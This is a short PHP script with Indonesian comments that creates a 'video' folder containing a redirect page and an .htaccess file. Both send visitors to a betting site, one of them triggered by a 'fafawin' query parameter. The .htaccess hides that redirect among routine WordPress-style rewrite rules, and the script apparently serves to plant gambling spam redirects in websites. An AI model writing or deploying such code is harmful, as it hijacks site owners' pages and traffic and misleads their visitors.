<?php
$folder = 'video';
$redirect_url = 'https://betwaybet.in/publicenemy';

// 1. Buat folder 'video' jika belum ada
if (!file_exists($folder)) {
    mkdir($folder, 0755, true);
}

// 2. Buat index.php dengan redirect ke betwaybet.in/publicenemy
$index_php_content = <<<PHP
<?php
header("Location: $redirect_url", true, 301);
exit;
?>
PHP;

file_put_contents("$folder/index.php", $index_php_content);

// 3. Buat .htaccess dengan isi aturan rewrite dan redirect fafawin
$htaccess_content = <<<HTACCESS
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{QUERY_STRING} (^|&)fafawin= [NC]
RewriteRule ^ https://betwaybet.in/publicenemy? [L,R=301]
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
HTACCESS;

file_put_contents("$folder/.htaccess", $htaccess_content);

echo "Folder '$folder' dan file index.php + .htaccess berhasil dibuat.";
?>
